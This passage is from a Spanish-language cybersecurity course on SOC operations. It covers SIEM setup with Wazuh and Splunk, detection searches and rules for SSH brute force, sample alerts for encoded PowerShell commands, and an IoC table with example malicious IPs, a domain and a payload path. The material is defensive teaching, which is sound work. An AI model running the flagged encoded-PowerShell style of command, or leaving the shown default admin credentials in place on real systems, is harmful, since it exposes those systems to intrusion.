| **Inicio**         | **atrás 6**                                                                        | **Siguiente 8**                                                                         |
| ------------------ | ---------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------- |
| [🏠](../README.md) | [⏪](./6_6_Ciberseguridad_y_Hardening_de_Sistemas_Operativos_Endpoint_Security.md) | [⏩](./6_8_Firma_digital_Certificado_digital_y_PKI_Infraestructura_de_clave_publica.md) |

---

## **Índice**

| Temario                                                                                                                                     |
| ------------------------------------------------------------------------------------------------------------------------------------------- |
| [544. ¿Qué es un SOC?](#544-qué-es-un-soc)                                                                                                  |
| [545. Capacidades/Servicios de un SOC](#545-capacidadesservicios-de-un-soc)                                                                 |
| [546. SIEM Intelligence & Alerting](#546-siem-intelligence--alerting)                                                                       |
| [547. Security Information and Event Management (SIEM)](#547-security-information-and-event-management-siem)                                |
| [548. Caso práctico: Despliegue y uso de un SIEM profesional - Splunk](#548-caso-práctico-despliegue-y-uso-de-un-siem-profesional---splunk) |
| [549. Indicadores de compromiso (IoC) y MISP](#549-indicadores-de-compromiso-ioc-y-misp)                                                    |
| [550. Monitorización & Triage](#550-monitorización--triage)                                                                                 |
| [551. Ticketing y gestión de incidentes - TheHive](#551-ticketing-y-gestión-de-incidentes---thehive)                                        |
| [552. Integración de Splunk con TheHive](#552-integración-de-splunk-con-thehive)                                                            |
| [553. TheHive + Cortex](#553-thehive--cortex)                                                                                               |
| [554. Respuesta a incidentes de seguridad](#554-respuesta-a-incidentes-de-seguridad)                                                        |
| [555. NIST SP 800-61: Computer Security Incident Handling Guide](#555-nist-sp-800-61-computer-security-incident-handling-guide)             |
| [556. Uso de un SOAR - Splunk SOAR (Phantom)](#556-uso-de-un-soar---splunk-soar-phantom)                                                    |
| [557. Threat Hunting](#557-threat-hunting)                                                                                                  |
| [558. Sandboxing - Cuckoo Sandbox](#558-sandboxing---cuckoo-sandbox)                                                                        |
| [559. Gestión de vulnerabilidades y evaluaciones de seguridad](#559-gestión-de-vulnerabilidades-y-evaluaciones-de-seguridad)                |
| [560. Análisis de vulnerabilidades - Nessus](#560-análisis-de-vulnerabilidades---nessus)                                                    |
| [561. CVE, CVSS y CPE](#561-cve-cvss-y-cpe)                                                                                                 |
| [562. Honeypot](#562-honeypot)                                                                                                              |
| [563. Elimina los recursos de AWS](#563-elimina-los-recursos-de-aw)                                                                         |

---

# **Operaciones de Seguridad (SOC): Monitorizacion y Repuesta a Incidentes**

## **544. ¿Qué es un SOC?**

### 🛡️ ¿Qué es un SOC?

---

### 🧠 Definición sencilla

**SOC** significa **Security Operations Center**, o en español: **Centro de Operaciones de Seguridad**.

Es un **equipo de expertos en ciberseguridad**, junto con tecnología y procesos, que se dedica a:

> **Detectar, monitorear, analizar y responder a incidentes de seguridad en tiempo real**, las 24 horas del día.

---

### 🧩 ¿Qué hace un SOC?

El SOC **protege toda la infraestructura de TI** de una organización (redes, servidores, endpoints, aplicaciones, usuarios, etc.).

#### 🔍 Sus tareas principales:

| Función                         | Descripción                                                                   |
| ------------------------------- | ----------------------------------------------------------------------------- |
| **Monitoreo 24/7**              | Vigila sistemas continuamente buscando amenazas                               |
| **Detección de amenazas**       | Usa alertas, logs y herramientas (como SIEM, EDR, XDR) para encontrar ataques |
| **Análisis de incidentes**      | Evalúa qué tan grave es una amenaza y cómo afecta a la empresa                |
| **Respuesta a incidentes**      | Actúa para detener, contener o remediar un ataque                             |
| **Gestión de vulnerabilidades** | Ayuda a encontrar y corregir puntos débiles en la infraestructura             |
| **Investigación forense**       | Estudia lo que pasó en un ataque (cómo ocurrió, qué afectó, etc.)             |
| **Reportes y métricas**         | Genera reportes para gerentes o reguladores                                   |

---

### 👨‍💻 ¿Quién trabaja en un SOC?

Un SOC tiene varios roles:

| Rol                           | Función principal                                               |
| ----------------------------- | --------------------------------------------------------------- |
| **Analista SOC Nivel 1 (L1)** | Monitoreo inicial, filtrado de alertas, escalamiento            |
| **Analista SOC Nivel 2 (L2)** | Analiza incidentes, investiga alertas en profundidad            |
| **Analista SOC Nivel 3 (L3)** | Respuesta avanzada, caza de amenazas (Threat Hunting)           |
| **Ingeniero SOC**             | Configura herramientas, automatiza, mantiene la infraestructura |
| **Manager SOC**               | Coordina el equipo y comunica con la dirección                  |

---

### 🏢 Tipos de SOC

| Tipo                       | Descripción                                                  |
| -------------------------- | ------------------------------------------------------------ |
| **Interno**                | La empresa crea su propio SOC                                |
| **SOC tercerizado (MSSP)** | Se contrata a una empresa externa (como IBM, Deloitte, etc.) |
| **Híbrido**                | Una mezcla entre interno y externalizado                     |
| **SOC Virtual**            | Se opera en la nube, con equipos distribuidos globalmente    |

---

### 🧰 Herramientas comunes en un SOC

| Herramienta   | Propósito                              | Ejemplo                |
| ------------- | -------------------------------------- | ---------------------- |
| **SIEM**      | Analiza y correlaciona logs            | Wazuh, Splunk, ELK     |
| **EDR**       | Protección y monitoreo en endpoints    | CrowdStrike, OpenEDR   |
| **XDR**       | Extiende detección a red, correo, nube | Microsoft Defender XDR |
| **HIDS/HIPS** | Detecta actividad anómala en el host   | OSSEC, Wazuh           |
| **Firewall**  | Controla el tráfico de red             | pfSense, Fortinet      |

---

### 📊 Ejemplo fácil de entender

Imagina que eres responsable de TI en un banco. Un usuario descarga sin querer un archivo llamado `Factura2025.pdf.exe`. Esto enciende una **alerta en el EDR**, que la envía al **SIEM**.
Un **analista SOC L1** revisa la alerta, ve que es una amenaza de tipo ransomware, y la **escalan al L2**, quien aísla el equipo, analiza qué hizo el malware y lo elimina.

---

### 🧱 ¿Cómo se "instala" o construye un SOC?

> No es como instalar un programa. Es crear toda una **infraestructura de personas, procesos y tecnología**.

Pero si eres una empresa pequeña, puedes crear un **mini SOC básico**, con herramientas gratuitas y en la nube.

---

### 🚀 Caso práctico completo: Crear un SOC básico con herramientas gratuitas

---

#### 🧑‍💻 Escenario

Eres el responsable de seguridad de una empresa con 10 computadoras. Quieres monitorear posibles amenazas en tiempo real, detectar anomalías y actuar rápidamente.

---

#### 🔧 Paso 1: Elegir un SIEM gratuito → **Wazuh**

- Wazuh es una plataforma SIEM/HIDS open-source.
- Recolecta logs, detecta amenazas, genera alertas.

##### 🛠️ Instalación en Ubuntu

```bash
curl -sO https://packages.wazuh.com/4.8/wazuh-install.sh
bash wazuh-install.sh --wazuh-manager --wazuh-dashboard --elastic
```

---

#### 🔧 Paso 2: Instalar el **agente Wazuh** en los endpoints

Ejemplo en Windows:

1. Descarga el agente desde:
   [https://packages.wazuh.com](https://packages.wazuh.com/4.x/windows/)
2. Instálalo, y configura el IP del manager
3. Valida que aparezca en el dashboard

---

#### 🔧 Paso 3: Configurar alertas

Wazuh tiene reglas predefinidas:

- Detecta ejecución de scripts sospechosos
- Cambios en archivos críticos
- Errores de inicio de sesión
- Actividad de malware conocida

---

#### 🔧 Paso 4: Recolectar logs de red con **Filebeat + Sysmon**

- Instala Sysmon para registrar actividad de bajo nivel
- Instala Filebeat para enviar logs a Wazuh

---

#### 🔧 Paso 5: Respuesta a incidentes

Cuando Wazuh detecta algo raro, por ejemplo:

```
Alerta: script .vbs ejecutado desde el escritorio de un usuario
Nivel: 10 (crítico)
Regla: 18107
```

👉 El analista investiga, aísla el equipo y genera un informe.

---

### 🔐 Resultado final

Tienes un mini SOC con:

✅ Monitoreo de endpoints (Wazuh Agent)

✅ Detección de malware y scripts sospechosos

✅ SIEM con alertas en tiempo real

✅ Logs centralizados

✅ Capacidad de investigar incidentes

---

### 📌 Conclusión

- Un **SOC** es el **corazón de la ciberseguridad activa** en una organización.
- Protege en tiempo real, detecta amenazas y coordina la respuesta.
- No solo es tecnología, sino también **personas entrenadas y procesos definidos**.
- Puedes empezar un **SOC básico** con herramientas gratuitas como Wazuh, OpenEDR y ELK.

---

[🔼](#índice)

---

## **545. Capacidades/Servicios de un SOC**

### 🧠 ¿Qué significa “capacidades/servicios de un SOC”?

Son **todas las funciones, tareas y servicios que un SOC ofrece para proteger una organización frente a amenazas cibernéticas**. Un buen SOC no solo detecta ataques, sino que también responde, investiga, mejora la seguridad, y más.

---

### 🔧 Capacidades principales de un SOC

A continuación te explico cada una con lenguaje claro, ejemplos y qué herramientas se usan:

---

#### 1. **Monitoreo de Seguridad 24/7**

> El SOC **vigila todos los sistemas y redes continuamente**, sin descanso.

🧩 Ejemplo:

> Si alguien intenta iniciar sesión 5 veces con contraseña incorrecta a las 3 AM, el SOC lo detecta.

🔧 Herramientas comunes:

- SIEM (como Wazuh, Splunk, ELK)
- EDR/XDR (como CrowdStrike, OpenEDR)

---

#### 2. **Detección y Respuesta ante Incidentes (Incident Detection & Response)**

> Si el SOC detecta un ataque o comportamiento extraño, **actúa rápidamente**: aísla, investiga y mitiga.

🧩 Ejemplo:

> Se detecta un ransomware ejecutándose en una laptop → el equipo SOC lo aísla de la red y elimina el proceso.

🔧 Herramientas:

- EDR (OpenEDR, Defender ATP)
- SOAR (automatiza la respuesta, como TheHive, Cortex)

---

#### 3. **Análisis de amenazas (Threat Intelligence)**

> El SOC utiliza inteligencia sobre nuevas amenazas globales para **anticiparse a ataques**.

🧩 Ejemplo:

> Se informa de un nuevo virus dirigido a bancos → el SOC aplica reglas para detectar ese virus si aparece.

🔧 Herramientas:

- MISP (Plataforma de inteligencia de amenazas)
- VirusTotal (para verificar archivos/sitios maliciosos)

---

#### 4. **Gestión de vulnerabilidades**

> El SOC ayuda a encontrar puntos débiles en los sistemas para **cerrar puertas antes de que entren los atacantes**.

🧩 Ejemplo:

> Un servidor tiene una versión vieja de Apache → el SOC notifica que se debe actualizar.

🔧 Herramientas:

- OpenVAS, Nessus
- Wazuh (alertas sobre software desactualizado)

---

#### 5. **Análisis forense**

> Si ocurre un ataque, el SOC **revisa los logs, archivos y tráfico de red** para entender qué pasó y cómo.

🧩 Ejemplo:

> Investigan cómo un atacante entró al sistema, qué archivos tocó, y si dejó puertas traseras.

🔧 Herramientas:

- Autopsy, Volatility (forense)
- Sysmon + ELK/Wazuh (eventos de Windows)

---

#### 6. **Caza de amenazas (Threat Hunting)**

> Analistas del SOC **buscan amenazas ocultas** que pasaron desapercibidas por las herramientas automáticas.

🧩 Ejemplo:

> Revisan logs antiguos para detectar movimientos laterales silenciosos hechos por un atacante.

🔧 Herramientas:

- Sigma rules, YARA rules
- OSQuery, Splunk para búsquedas avanzadas

---

#### 7. **Gestión de logs y eventos**

> Recolecta, centraliza y analiza todos los eventos (logs) del sistema.

🧩 Ejemplo:

> Detectan que un usuario eliminó cientos de archivos sin autorización, gracias al log del sistema de archivos.

🔧 Herramientas:

- Filebeat, Logstash, Fluentd
- SIEM como Wazuh o Graylog

---

#### 8. **Control de cumplimiento normativo**

> El SOC verifica que se cumplan normas como **ISO 27001**, **GDPR**, **HIPAA**, etc.

🧩 Ejemplo:

> Detectan que no se están cifrando los datos de los pacientes → alertan para cumplir con la norma HIPAA.

🔧 Herramientas:

- Wazuh (cumplimiento con CIS Benchmark, PCI-DSS, etc.)
- Compliance frameworks automatizados

---

#### 9. **Automatización de tareas (SOAR)**

> Automatiza respuestas comunes: bloquear IPs, aislar equipos, generar reportes.

🧩 Ejemplo:

> Cada vez que una IP escanea más de 100 puertos → se bloquea automáticamente con un script.

🔧 Herramientas:

- TheHive + Cortex
- Shuffle, StackStorm

---

### 📌 Ejemplo práctico completo: Un día en un mini SOC

---

#### 🎯 Escenario: empresa mediana con un SOC básico montado

Tienen:

- Wazuh (como SIEM y HIDS)
- OpenEDR en los endpoints
- Sysmon para eventos detallados
- TheHive para gestión de incidentes

---

#### 🕒 Hora 1: Monitoreo detecta intento de ataque

- Wazuh genera una alerta: `Intento de ejecución de PowerShell codificado en base64`
- Nivel de alerta: 12 (crítico)

---

#### 🕒 Hora 2: El SOC actúa

- Analista L1 revisa el alerta, escala al L2
- L2 usa OpenEDR para aislar el equipo de la red
- Se crea un incidente en TheHive

---

#### 🕒 Hora 3: Investigación

- Usan Sysmon para ver qué proceso originó el ataque: `Word.exe` ejecutó PowerShell
- Se detecta macro maliciosa en un archivo adjunto

---

#### 🕒 Hora 4: Respuesta y aprendizaje

- Se elimina el archivo malicioso
- Se actualan reglas en el firewall y EDR para bloquear ese comportamiento
- Se notifica a los usuarios con una alerta educativa
- Se genera un informe para el área legal y gerencial

---

### 🧱 ¿Cómo se implementan estas capacidades?

Un SOC puede desplegarse así:

| Componente         | Herramienta recomendada          |
| ------------------ | -------------------------------- |
| SIEM               | Wazuh, ELK, Splunk               |
| Detección Endpoint | OpenEDR, Microsoft Defender EDR  |
| Gestión de eventos | TheHive, Cortex, MISP            |
| Caza de amenazas   | Sigma, YARA, OSQuery             |
| Forense            | Volatility, Autopsy              |
| Automatización     | SOAR (Shuffle, TheHive + Cortex) |

---

### 🎓 Conclusión

Un SOC es como el **"centro de comando de ciberseguridad"** de una organización.

Sus capacidades incluyen:

✅ Detectar

✅ Responder

✅ Investigar

✅ Mejorar

✅ Automatizar

✅ Cumplir normativas

Todo esto con personal especializado, herramientas adecuadas y procesos bien definidos.

---

[🔼](#índice)

---

## **546. SIEM Intelligence & Alerting**

### ✅ 1. ¿Qué es un SIEM?

**SIEM** significa **Security Information and Event Management**.

🔍 Es una herramienta que:

- **Recoge logs y eventos** de muchos sistemas (Windows, Linux, firewall, antivirus, etc.)
- **Detecta comportamientos sospechosos o maliciosos**
- **Genera alertas** para que el equipo de ciberseguridad actúe
- **Ayuda a investigar incidentes** con contexto completo

---

### 🧠 ¿Para qué sirve la "Inteligencia y Alertas"?

La **Inteligencia** permite identificar amenazas conocidas (como ataques, virus, ransomware, etc.) y adaptarse a nuevas amenazas.
Las **Alertas** se generan cuando algo raro ocurre, basado en:

- **Firmas** (ataques conocidos)
- **Comportamientos anómalos**
- **Reglas personalizadas** (por ejemplo: “no se debe iniciar sesión de madrugada desde otro país”)

---

### 🧩 Ejemplo simple

Supón que tienes un servidor Windows.

🔸 Si alguien intenta iniciar sesión 10 veces con contraseñas incorrectas en 5 minutos…
🔸 …eso se considera un intento de fuerza bruta.
🔸 El SIEM detecta ese patrón y **lanza una alerta al equipo de seguridad.**

---

### 🛠️ ¿Qué herramientas SIEM existen?

- **Wazuh** (libre y muy usado)
- **Splunk**
- **Graylog**
- **ELK Stack (Elasticsearch + Logstash + Kibana)**
- **AlienVault OSSIM (de código abierto)**

---

### 🏗️ 2. ¿Cómo se instala un SIEM (como Wazuh)?

Te mostraré cómo instalar **Wazuh** en Ubuntu (puede correr en máquinas virtuales o nube).

#### Requisitos:

- Una máquina Ubuntu Server (22.04 recomendado)
- Al menos 4 GB de RAM

---

#### 🔧 Paso a paso para instalar Wazuh (SIEM completo)

##### 🧰 Paso 1: Actualiza tu sistema

```bash
sudo apt update && sudo apt upgrade -y
```

##### 🧰 Paso 2: Instala Docker (Wazuh lo usa)

```bash
sudo apt install docker.io docker-compose -y
sudo systemctl enable docker
```

##### 🧰 Paso 3: Clona el repositorio de Wazuh

```bash
git clone https://github.com/wazuh/wazuh-docker.git -b v4.7.3
cd wazuh-docker/single-node
```

##### 🧰 Paso 4: Levanta el SIEM

```bash
sudo docker-compose up -d
```

##### ✅ Espera unos minutos. Luego accede desde tu navegador a:

```
https://TU_IP:443
Usuario: admin
Contraseña: SecretPassword (la encuentras en los logs o config)
```

---

### 🧠 3. ¿Cómo funciona la parte de "Intelligence & Alerting"?

#### A. **Recolecta eventos (logs)**

- Eventos del sistema (ej. logs de Windows, SSH, antivirus, etc.)
- Comportamientos del usuario
- Cambios en archivos

💡 Ejemplo:

> Wazuh recibe un log que dice:
>
> “Usuario root ha editado `/etc/passwd` sin autorización.”

---

#### B. **Aplica inteligencia y reglas (detección)**

Las reglas pueden ser:

- **Predefinidas:** fuerza bruta, malware conocido, ejecución de scripts peligrosos, etc.
- **Personalizadas:** tú puedes crear tus propias condiciones.

💡 Ejemplo:

> “Si alguien usa PowerShell codificado, genera alerta crítica”.

---

#### C. **Genera una alerta**

Cuando se cumple una regla, el SIEM genera una alerta y la muestra en su panel.

🔔 Ejemplo de alerta real:

```
Rule: 5712 (level 12) -> 'User trying to escalate privileges via sudo'
Location: Agent1->/var/log/auth.log
```

---

#### D. **El analista de ciberseguridad actúa**

- **Revisa la alerta**
- **Investiga el contexto (qué proceso, qué usuario, cuándo)**
- **Responde:** bloquea IP, aísla equipo, elimina amenaza

---

### 🧪 4. Ejemplo práctico completo

#### 🎯 Escenario: Empresa con SIEM Wazuh en producción

##### 🔸 Caso:

El SIEM detecta este log desde un endpoint:

```
Event: User 'gustavo' executed powershell with suspicious base64 string
```

##### 🔍 ¿Qué hace Wazuh?

1. Recolecta el log del sistema.
2. Aplica una **regla predefinida** que dice:
   “Detectar PowerShell con código base64 → nivel de alerta 10 o más”.
3. Genera esta alerta:

```
Rule: 92101 (level 12) -> 'Suspicious PowerShell encoded command'
Location: endpoint-01->Windows Event Logs
```

##### 👨‍💻 ¿Qué hace el analista SOC?

- Revisa la alerta.
- Usa el panel Kibana para ver:

  - ¿Qué usuario?
  - ¿Qué hora?
  - ¿Desde qué IP?

- Verifica si el comando era malicioso.
- Si es una amenaza:

  - Aísla el equipo con EDR.
  - Notifica al usuario.
  - Escribe un informe.

---

### 📈 ¿Cómo crear tus propias reglas de alerta en Wazuh?

Ejemplo: alerta si alguien intenta conectarse a SSH como root

```xml
<group name="sshd,authentication_failed,">
  <rule id="100010" level="10">
    <decoded_as>json</decoded_as>
    <field name="event_data.user">root</field>
    <description>SSH login attempt with user root</description>
  </rule>
</group>
```

---

### 🧩 ¿Dónde se guarda todo esto?

- Logs → Elasticsearch
- Reglas → Wazuh rules directory
- Dashboards → Kibana
- Alertas → Panel de Wazuh

---

### 📌 Conclusión

| Elemento          | Explicación fácil                                    |
| ----------------- | ---------------------------------------------------- |
| **SIEM**          | Centraliza y analiza todos los eventos del sistema   |
| **Inteligencia**  | Usa firmas, reglas y patrones para detectar amenazas |
| **Alertas**       | Notifican comportamientos sospechosos o ataques      |
| **Investigación** | Permite rastrear ataques con contexto completo       |
| **Respuesta**     | Inicia acciones para detener amenazas                |

---

[🔼](#índice)

---

## **547. Security Information and Event Management (SIEM)**

### ✅ 1. ¿Qué es un SIEM?

**SIEM (Security Information and Event Management)** es una solución de ciberseguridad que:

| Función                       | Explicación sencilla                                                                 |
| ----------------------------- | ------------------------------------------------------------------------------------ |
| 📦 **Recolecta datos**        | Toma logs (registros) de muchos sistemas: Windows, Linux, firewalls, antivirus, etc. |
| 🧠 **Analiza en tiempo real** | Busca patrones de ataques o errores peligrosos.                                      |
| 🔔 **Genera alertas**         | Si ve algo raro (ej: muchos intentos de inicio de sesión), te avisa.                 |
| 🕵️‍♂️ **Permite investigar**     | Muestra qué pasó, cuándo, cómo y desde dónde.                                        |

---

### 🧠 ¿Por qué es importante?

Porque **sin SIEM no puedes saber si estás siendo atacado** hasta que ya es tarde. El SIEM actúa como un **centinela 24/7**, mirando todos los movimientos en tu red y sistemas.

---

### 📊 Ejemplo fácil de entender

Imagina que tienes una empresa:

- Tienes 5 computadoras, un servidor web y una red Wi-Fi.
- Alguien intenta entrar con contraseñas incorrectas al servidor muchas veces.

Sin SIEM:

⚠️ No te das cuenta.

Con SIEM:

🔔 Se genera una alerta:

> "Alerta: 25 intentos de inicio de sesión fallidos desde 190.25.43.21"

Así puedes actuar antes de que logren entrar.

---

### 🧰 2. ¿Qué herramientas SIEM existen?

| Herramienta          | Licencia                              | Dificultad | Ideal para...                |
| -------------------- | ------------------------------------- | ---------- | ---------------------------- |
| **Wazuh**            | Gratis (open source)                  | Media      | Empresas pequeñas/medianas   |
| **Splunk**           | Comercial con versión gratis limitada | Alta       | Empresas grandes             |
| **Graylog**          | Gratis con opción Enterprise          | Media      | Log de servidores            |
| **Elastic SIEM**     | Gratis                                | Media      | SIEM basado en Elasticsearch |
| **AlienVault OSSIM** | Gratis                                | Media      | Uso educativo o PYMEs        |

---

### 💻 3. ¿Cómo se instala un SIEM?

#### Vamos a instalar **Wazuh**, uno de los SIEM gratuitos más potentes.

---

#### 🔧 Requisitos previos:

- Una máquina con **Ubuntu 20.04 o 22.04 LTS**
- Al menos **4 GB RAM y 2 CPU**
- Tener **Docker y Docker Compose**

---

#### 🚀 PASOS DE INSTALACIÓN DE WAZUH (SIEM)

##### 📥 Paso 1: Instalar Docker y Docker Compose

```bash
sudo apt update && sudo apt install docker.io docker-compose -y
sudo systemctl enable docker
```

##### 📥 Paso 2: Descargar el entorno de Wazuh

```bash
git clone https://github.com/wazuh/wazuh-docker.git -b v4.7.3
cd wazuh-docker/single-node
```

##### ▶️ Paso 3: Levantar los servicios

```bash
sudo docker-compose up -d
```

🔁 Espera de 5 a 10 minutos.

##### 🌐 Paso 4: Accede al panel web

Abre tu navegador y visita:

```
https://TU_IP_PUBLICA
```

Las credenciales predeterminadas:

- Usuario: `admin`
- Contraseña: `SecretPassword` (aparece en consola/logs)

---

### 🧪 4. Caso práctico: Uso real del SIEM

#### 🎯 Escenario:

Tienes un SIEM Wazuh monitoreando 2 computadoras de oficina.

Un empleado (sin querer) descarga un archivo malicioso que ejecuta PowerShell para conectarse a un atacante remoto.

---

#### 🔍 ¿Qué hace el SIEM?

1. El **agente Wazuh instalado en el equipo** detecta que PowerShell ejecutó un script en base64 (común en ataques).
2. Wazuh tiene una regla que identifica este comportamiento como sospechoso.
3. Se genera esta alerta:

```
Alerta nivel 12: PowerShell sospechoso detectado
Usuario: empleado123
Comando: powershell -EncodedCommand <...>
Hora: 12:34:22
Equipo: PC-Oficina1
```

4. En el **panel de Wazuh**, ves la alerta en rojo.
5. El analista revisa qué ocurrió y decide:

✅ Aislar la máquina

✅ Notificar al usuario

✅ Eliminar el script malicioso

✅ Agregar una regla para evitarlo en el futuro

---

### 📍 ¿Qué tipo de alertas puede generar un SIEM?

| Categoría               | Ejemplos                                         |
| ----------------------- | ------------------------------------------------ |
| 🔑 Inicio de sesión     | Muchos intentos fallidos (fuerza bruta)          |
| 🛠️ Cambios en archivos  | Modificaciones en `/etc/passwd` (Linux)          |
| ⚠️ Ejecución sospechosa | PowerShell o bash ejecutando código cifrado      |
| 🌐 Conexiones extrañas  | IPs de países sospechosos conectando al servidor |
| 🔍 Privilegios elevados | Usuario intentando ser administrador sin permiso |

---

### 📄 ¿Qué más puedes hacer con Wazuh?

- Integrarlo con **VirusTotal** para saber si un archivo es malicioso.
- Configurar alertas por **correo electrónico o Slack**.
- Crear tus propias reglas personalizadas.
- Ver dashboards en **Kibana** (visualización de alertas).

---

### 📦 Dónde se guarda la información

| Componente    | Rol                                             |
| ------------- | ----------------------------------------------- |
| Wazuh Manager | Procesa los logs y aplica reglas                |
| Elasticsearch | Guarda los logs y alertas                       |
| Kibana        | Muestra la información visualmente              |
| Wazuh Agent   | Se instala en los endpoints y recolecta eventos |

---

### 🧩 Estructura de una alerta en Wazuh

```json
{
  "rule": {
    "level": 12,
    "description": "PowerShell encoded command execution",
    "id": 92001
  },
  "agent": {
    "name": "PC-Oficina1",
    "id": "002"
  },
  "data": {
    "command": "powershell -encodedCommand ..."
  },
  "timestamp": "2025-07-23T12:34:22.000Z"
}
```

---

### 📌 Conclusión

| Elemento                   | Qué significa para ti                        |
| -------------------------- | -------------------------------------------- |
| **SIEM**                   | Te protege al ver todo lo que pasa           |
| **Wazuh**                  | Es una opción gratuita para usar SIEM        |
| **Alertas e inteligencia** | Te avisan cuando algo raro ocurre            |
| **Investigación**          | Puedes analizar incidentes a fondo           |
| **Visualización**          | Ver dashboards con datos claros y filtrables |

---

[🔼](#índice)

---

## **548. Caso práctico: Despliegue y uso de un SIEM profesional - Splunk**

### ✅ 1. ¿Qué es Splunk?

**Splunk** es una plataforma profesional de **SIEM (Security Information and Event Management)** que:

- Recolecta, indexa y analiza datos de registros (logs) de todo tipo: servidores, redes, aplicaciones, antivirus, etc.
- Ofrece potentes funciones de **búsqueda, alertas y visualización** de eventos en tiempo real.
- Es usada por empresas y equipos SOC para detectar amenazas y responder ante incidentes.

> 🧠 Piénsalo como una “lupa” gigante que lee todo lo que pasa en tus sistemas y te dice si algo anda mal.

---

### 🧠 ¿Por qué Splunk es considerado SIEM profesional?

| Característica                | Descripción                                          |
| ----------------------------- | ---------------------------------------------------- |
| 📊 Dashboards personalizables | Muestra visualizaciones avanzadas                    |
| ⚡ Análisis en tiempo real    | Reacciona a eventos al instante                      |
| 🛎️ Alertas automáticas        | Te notifica si algo sospechoso pasa                  |
| 🔍 Búsqueda avanzada (SPL)    | Permite investigar todo con su lenguaje de consultas |
| 🔗 Integraciones              | Compatible con antivirus, firewalls, nubes, etc.     |

---

### 📦 2. ¿Qué necesito para instalar Splunk?

| Requisito | Detalle                                    |
| --------- | ------------------------------------------ |
| Sistema   | Ubuntu 20.04/22.04 o Windows Server/Linux  |
| CPU/RAM   | Al menos 4 GB RAM, 2 CPUs                  |
| Disco     | +10 GB de espacio (para almacenar logs)    |
| Acceso    | Navegador web para acceder al panel Splunk |

---

### 🛠️ 3. Instalación paso a paso de **Splunk Free** (en Linux Ubuntu)

---

#### 🔧 Paso 1: Crear cuenta en Splunk

Ve a [https://www.splunk.com](https://www.splunk.com) y crea una cuenta gratuita.

Descarga **Splunk Enterprise** (puede usarse gratis por 60 días):

👉 [https://www.splunk.com/en_us/download/splunk-enterprise.html](https://www.splunk.com/en_us/download/splunk-enterprise.html)

---

#### 💻 Paso 2: Subir el archivo `.deb` a tu servidor Linux

Ejemplo:

```bash
wget -O splunk-9.2.1.deb 'https://download.splunk.com/products/splunk/releases/9.2.1/linux/splunk-9.2.1-a9e6fe1b0761-linux-2.6-amd64.deb'
```

#### 📦 Paso 3: Instalar Splunk

```bash
sudo dpkg -i splunk-9.2.1.deb
```

---

#### ▶️ Paso 4: Iniciar Splunk por primera vez

```bash
sudo /opt/splunk/bin/splunk start --accept-license
```

Crea usuario y contraseña admin en este paso.

---

#### 🌐 Paso 5: Accede al panel web

Desde tu navegador accede a:

```
http://TU_IP:8000
```

Ejemplo:
**[http://192.168.1.100:8000](http://192.168.1.100:8000)**

---

### 📥 4. Ingesta de logs en Splunk

#### Ejemplo sencillo: Logs del sistema

Una vez dentro de Splunk:

1. Ir a **Settings > Add Data**
2. Elegir **Monitor**
3. Seleccionar `/var/log/` para leer logs del sistema (ej. `auth.log`, `syslog`)
4. Crear el índice: `sistema`
5. Guardar y aplicar

---

### 📌 5. Caso práctico: Detectar intentos de ataque en Linux

#### 🧪 Escenario real:

Tienes un servidor Ubuntu. Alguien intenta hacer login SSH muchas veces (fuerza bruta).

---

#### 1️⃣ Splunk recolecta `/var/log/auth.log`

Este archivo contiene todos los inicios de sesión.

---

#### 2️⃣ Buscar actividad sospechosa en Splunk

Usas una búsqueda como esta en Splunk:

```spl
index=sistema "Failed password"
```

Esto te mostrará todos los intentos de contraseña fallida por SSH.

---

#### 3️⃣ Analizar la IP atacante

```spl
index=sistema "Failed password" | stats count by host, src
```

Esto te muestra cuántos intentos fallidos hubo desde cada IP.

🔔 Si una IP hizo muchos intentos → es sospechosa.

---

#### 4️⃣ Crear alerta

Puedes guardar esta búsqueda y crear una alerta:

- Condición: `más de 10 intentos fallidos en 5 minutos`
- Acción: enviar correo o ejecutar script (bloquear IP)

---

### 📈 6. Crear dashboard con gráficos

1. Guarda tu búsqueda como panel
2. Agrega gráficos de barras o líneas:

   - IPs más activas
   - Usuarios más atacados
   - Horas con más actividad

Resultado: un **dashboard tipo SOC** donde puedes ver todo lo que pasa.

---

### 📋 7. Resumen del flujo de trabajo

| Paso                       | Herramienta / Acción             |
| -------------------------- | -------------------------------- |
| 1. Recolectar logs         | Splunk lee `/var/log/auth.log`   |
| 2. Detectar anomalías      | Consulta SPL (`Failed password`) |
| 3. Analizar fuente         | `stats count by src`             |
| 4. Crear alerta automática | Email si IP = sospechosa         |
| 5. Visualizar              | Dashboard en Splunk              |

---

### 🎯 Conclusión

| Concepto          | Valor para la empresa                               |
| ----------------- | --------------------------------------------------- |
| **Splunk SIEM**   | Visibilidad total y en tiempo real                  |
| **Alertas**       | Reacción rápida ante incidentes                     |
| **Investigación** | Saber qué, cuándo, cómo y desde dónde ocurrió algo  |
| **Dashboard**     | Ayuda a visualizar la ciberseguridad de forma clara |

---

[🔼](#índice)

---

## **549. Indicadores de compromiso (IoC) y MISP**

### ✅ 1. ¿Qué son los Indicadores de Compromiso (IoC)?

Los **IoC (Indicators of Compromise)** son **pruebas técnicas** de que un sistema ha sido o podría estar comprometido.

> 🧠 Piensa en los IoC como “huellas” que deja un atacante en un sistema.

---

### 🔍 Ejemplos de IoC comunes

| Tipo de IoC             | Ejemplo                                              | Qué indica                            |
| ----------------------- | ---------------------------------------------------- | ------------------------------------- |
| IP sospechosa           | `185.234.219.121`                                    | Dirección desde la que atacaron       |
| Dominio malicioso       | `evil-malware[.]com`                                 | URL usada para phishing o C2          |
| Hash de archivo         | `e99a18c428cb38d5f260853678922e03` (MD5)             | Firma digital de un archivo malicioso |
| Ruta sospechosa         | `C:\Users\Admin\AppData\Roaming\BadTool\payload.exe` | Programa malicioso escondido          |
| Firma de comportamiento | `PowerShell ejecutando desde Word`                   | Técnica de ataque                     |

---

### 🧩 ¿Para qué sirven los IoC?

- **Detectar malware y amenazas en tiempo real**
- **Investigar incidentes** de ciberseguridad
- **Compartir información** entre organizaciones
- **Actualizar antivirus, EDR o SIEM** con firmas de amenazas

---

### 🔐 2. ¿Qué es MISP?

**MISP** (Malware Information Sharing Platform & Threat Sharing) es una **plataforma open source** que:

- Permite **almacenar, compartir y automatizar** el manejo de IoCs
- Es usada por equipos SOC, gobiernos, CERTs y empresas
- Facilita el **intercambio de inteligencia de amenazas** (CTI)

> 🧠 Piénsalo como una base de datos colaborativa de amenazas en tiempo real.

---

### 🚦 3. ¿Qué puede hacer MISP?

| Función                              | Descripción                                |
